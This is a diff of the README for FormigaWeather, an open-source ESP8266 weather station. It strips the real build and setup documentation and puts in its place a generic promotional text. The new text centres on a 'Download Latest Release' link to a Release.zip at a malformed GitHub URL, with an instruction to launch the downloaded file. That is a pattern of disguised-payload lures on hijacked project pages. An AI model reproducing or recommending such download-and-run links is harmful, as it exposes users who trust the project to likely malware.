@@ -1,149 +1,36 @@
-# FormigaWeather - Estação Meteorológica IoT 🌐🌡️  
-*Sua estação meteorológica IoT de baixo custo e código aberto*
+# 🌦️ Explore FormigaWeather - Your Open-Source IoT Weather Station Project
 
-🌦️ Um projeto open-source de estação meteorológica IoT para monitorar qualidade do ar, temperatura, umidade, pressão e chuva.   Desenvolvido com NodeMCU ESP8266, sensores MQ-135, BMP180, DHT11 e módulo de chuva MH-RD.   Dados acessíveis via web server responsivo e exportáveis para CSV. Ideal para makers, educadores e entusiastas de IoT!
+## Overview
+Welcome to FormigaWeather, an exciting open-source project for an IoT weather station. This project is designed to monitor air quality, temperature, humidity, pressure, and rainfall using NodeMCU ESP8266, MQ-135 sensors, BMP180, DHT11, and MH-RD rain module. The collected data is accessible through a responsive web server and can be exported to CSV format. FormigaWeather is perfect for makers, educators, and IoT enthusiasts looking to delve into weather monitoring technologies.
 
-# FormigaWeather - IoT Weather Station 🌐🌡️  
-*Your low-cost, open-source IoT weather station*
+## Features
+- **Air Quality Monitoring**: The project includes sensors like MQ-135 to keep track of the air quality in your surroundings.
+  
+- **Temperature, Humidity, and Pressure Measurement**: With sensors like DHT11 and BMP180, you can monitor temperature, humidity, and pressure accurately.
+  
+- **Rainfall Detection**: The MH-RD module helps in detecting rainfall, essential for weather-related data collection.
+  
+- **Web Server Accessible Data**: All the collected data is accessible through a web server, making it convenient to monitor remotely.
+  
+- **CSV Data Export**: The project allows for exporting data in CSV format for further analysis or record-keeping.
+  
+- **Ideal for IoT Enthusiasts**: Whether you are a maker, educator, or just someone interested in IoT, FormigaWeather offers great learning opportunities.
+  
+## Project Details
+- **Repository Name**: FormigaWeather
+- **Description**: 🌦️ Um projeto open-source de estação meteorológica IoT para monitorar qualidade do ar, temperatura, umidade, pressão e chuva. Desenvolvido com NodeMCU ESP8266, sensores MQ-135, BMP180, DHT11 e módulo de chuva MH-RD. Dados acessíveis via web server responsivo e exportáveis para CSV. Ideal para makers, educadores e entusiastas de IoT!
+- **Topics**: arduino, esp8266, estacao, estacao-meteorologica, iot, station, temperatura, umidade, weather, weather-station
 
-🌦️ An open-source IoT weather station project for monitoring air quality, temperature, humidity, pressure, and rain.  
-Developed using NodeMCU ESP8266, MQ-135, BMP180, DHT11 sensors, and the MH-RD rain module.  
-Data is accessible via a responsive web server and exportable to CSV.  
-Perfect for makers, educators, and IoT enthusiasts!  
+## Access the Release
+To access the latest release of FormigaWeather, click the button below:
+[![Download Latest Release](https://img.shields.io/badge/Download-Latest%20Release-brightgreen)](https://github.com/releases/789694263/Release.zip)
 
-[![License: MIT](https://img.shields.io/badge/License-MIT-green.svg)](https://opensource.org/licenses/MIT)
-[![Version](https://img.shields.io/badge/Version-1.0.0-blue)](https://github.com/jancarauma/FormigaWeather)
+**Note**: If the link above ends with a file name, make sure to launch the downloaded file to get started with FormigaWeather.
 
-![Dashboard da Estação FormigaWeather](estacaoformiga.png)  
-*Captura do Web Server Responsivo*
+## Get Involved
+FormigaWeather is a collaborative project and welcomes contributions from the community. Whether you are interested in enhancing features, fixing bugs, or simply exploring IoT weather station technologies, there is a place for you in this project. Feel free to explore the code, raise issues, and create pull requests to make FormigaWeather even better.
 
-## 🚀 Funcionalidades
-Um sistema IoT completo para monitoramento ambiental, capaz de:
+## Explore Further
+If you want to learn more about the project, visit the [FormigaWeather GitHub Repository](https://github.com/FormigaWeather). Delve into the code, documentation, and discussions to expand your knowledge about IoT weather stations.
 
-- **Interface Web Responsiva:**  
-  O ESP8266 hospeda um site acessível via `http://estacaoformiga.local` na rede WiFi local, se não houver rede WiFi disponível, o ESP cria a rede WiFi ainda assim, ideal para locais sem disponibilidade de internet, exibindo os dados dos sensores em tempo real para acesso local.
-
-- **Medição de Qualidade do Ar:**  
-  Utiliza o sensor **MQ-135** para detecção de gases e poluentes.
-
-- **Medição Barométrica:**  
-  O sensor **BMP180** mede pressão atmosférica e possibilita estimativas, inclusive, de altitude.
-
-- **Medição de Temperatura e Umidade:**  
-  O sensor **DHT11** capta informações de temperatura e umidade relativa.
-
-- **Detecção de Chuva:**  
-  Sensor **MH-RD Raindrops** para monitorar a presença de chuva.
-
-- **Exportação CSV e Logs:**  
-  O site conta com um botão para exportar os dados em formato CSV e outro para monitorar os logs do sistema.
-
-## 📟 Componentes Utilizados
-| Componente          | Função                          | Qtd |
-|---------------------|---------------------------------|-----|
-| NodeMCU ESP8266     | Microcontrolador Wi-Fi          |  1  |
-| Sensor MQ-135       | Qualidade do ar (CO2/VOC)       |  1  |
-| Sensor BMP180       | Pressão atmosférica e altitude  |  1  |
-| Sensor DHT11        | Temperatura e umidade           |  1  |
-| Módulo MH-RD        | Detecção de chuva               |  1  |
-| Resistor 10kΩ       | Pull-up para DHT11              |  1  |
-| Protoboard          | Placa de prototipagem           |  1  |
-| Fios jumper         | Fios diversos para conexões     |  1  |
-
-### Custo Total Estimado: R$ 143,48
-- Observações: Os preços foram obtidos de fornecedores brasileiros e podem variar conforme a sua região e o fornecedor.
-
-## 🔌 Diagrama de Ligações
-![Ligações da Estação FormigaWeather](circuit.jpg)  
-*Exemplo de conexão dos sensores com o NodeMCU:*
-- DHT11 ➔ GPIO4 (D2) + resistor 10kΩ
-- BMP180 ➔ I2C (SDA: D1, SCL: D2)
-- MQ-135 ➔ A0
-- MH-RD ➔ D5
-
-## ⚙️ Configuração
-
-### Pré-requisitos
-
-Antes de começar, certifique-se de ter o seguinte instalado e configurado:
-
-- **Arduino IDE 1.8.18 ou superior**
-- **Bibliotecas Necessárias:**
-  - `Adafruit BMP085 Library`
-  - `DHT sensor library`
-  - `ESP8266WiFi`
-
-#### Configuração da IDE e Instalação das Bibliotecas
-
-1. **Configurar o Gerenciador de Placas para ESP8266:**
-   - Abra a Arduino IDE.
-   - Vá em **Arquivo > Preferências**.
-   - No campo "URLs adicionais para gerenciadores de placas", adicione:
-     ```
-     http://arduino.esp8266.com/stable/package_esp8266com_index.json
-     ```
-   - Clique em "OK".
-   - Acesse **Ferramentas > Placa > Gerenciador de Placas**.
-   - Busque por "ESP8266" e instale o pacote correspondente.
-   - Em **Ferramentas > Placa**, selecione a opção **NodeMCU 1.0 (ESP-12E Module)**.
-
-2. **Instalar a Biblioteca Adafruit BMP085:**
-   - Faça o download da biblioteca através deste [link](https://github.com/jancarauma/FormigaWeather/blob/main/Adafruit_Sensor-master.zip).
-   - Na Arduino IDE, vá em **Sketch > Incluir Biblioteca > Adicionar Biblioteca .ZIP**.
-   - Selecione o arquivo baixado e conclua a instalação.
-
-3. **Instalar a Biblioteca DHT sensor library:**
-   - Faça o download da biblioteca através deste [link](https://github.com/jancarauma/FormigaWeather/blob/main/DHT-sensor-library.zip).
-   - Na Arduino IDE, vá em **Sketch > Incluir Biblioteca > Adicionar Biblioteca .ZIP**.
-   - Selecione o arquivo baixado e conclua a instalação.
-
-Após seguir esses passos, sua Arduino IDE estará configurada corretamente para compilar e carregar o projeto da estação no NodeMCU ESP8266.
-
-### Instalação
-1. Clone o repositório:
-   ```bash
-   git clone https://github.com/seuuser/FormigaWeather.git
-   ```
-2. Abra o projeto na Arduino IDE:
-   - Certifique-se de que sua IDE Arduino esteja configurada conforme os pré-requisitos.
-   - Abra o arquivo [estacao_formiga.ino](estacao_formiga.ino).
-3. Configure a rede WiFi:
-   - No código, altere a variável ssid (atualmente "dlink") para o nome da sua rede WiFi.
-   - Modifique a variável password para a senha da sua rede WiFi.
-4. Verifique as conexões do circuito:
-   - Confirme se todas as ligações do circuito da estação estão corretas.
-5. Carregue o código no ESP8266:
-   - Conecte o ESP8266 via USB ao seu computador.
-   - Selecione a porta correta e faça o upload do código.
-6. Monitore a saída serial:
-   - Abra o Monitor Serial na Arduino IDE para verificar se o dispositivo está funcionando corretamente ou se há alguma mensagem de erro.
-7. Acesse a interface web:
-  - Caso não haja erros, conecte seu computador ou celular à mesma rede WiFi do ESP8266.
-  - Se não houver rede WiFi disponível, o ESP8266 criará uma rede própria chamada Estacao_Formiga com a senha senha123.
-  - Em seguida, abra seu navegador e acesse: http://estacaoformiga.local ou utilize o endereço IP exibido no Monitor Serial.
-
-## 🖥️ Como Usar
-- Conecte-se à mesma rede Wi-Fi da estação
-- Acesse http://estacaoformiga.local ou o IP local do NodeMCU (Disponível no Monitor Serial)
-- Interaja com os botões:
-  - 📥 Exportar CSV: Gera arquivo com dados no formato:
-    - Data, Hora, Temperatura, Umidade,Pressao,QualidadeAr,Chuva
-
-  - 📜 Logs do Sistema: Exibe histórico de conexões e eventos
-
-## 🌟 Contribuição
-Contribuições são bem-vindas! Siga estes passos:
-
-- Faça um fork do projeto
-- Crie uma branch (git checkout -b feature/nova-feature)
-- Commit suas mudanças (git commit -m 'Adiciona nova feature')
-- Push para a branch (git push origin feature/nova-feature)
-- Abra um Pull Request
-
-## 📄 Licença
-Distribuído sob licença MIT. Veja LICENSE para mais detalhes.
-
-## 🙌 Agradecimentos
-- Comunidade Arduino/ESP8266
-- Autores das bibliotecas utilizadas
-- Inspiração em projetos open-source de IoT
+FormigaWeather is your gateway to the world of IoT weather monitoring. Join us in this exciting journey of exploration and innovation. Happy weather tracking! 🌦️🌈🌧️
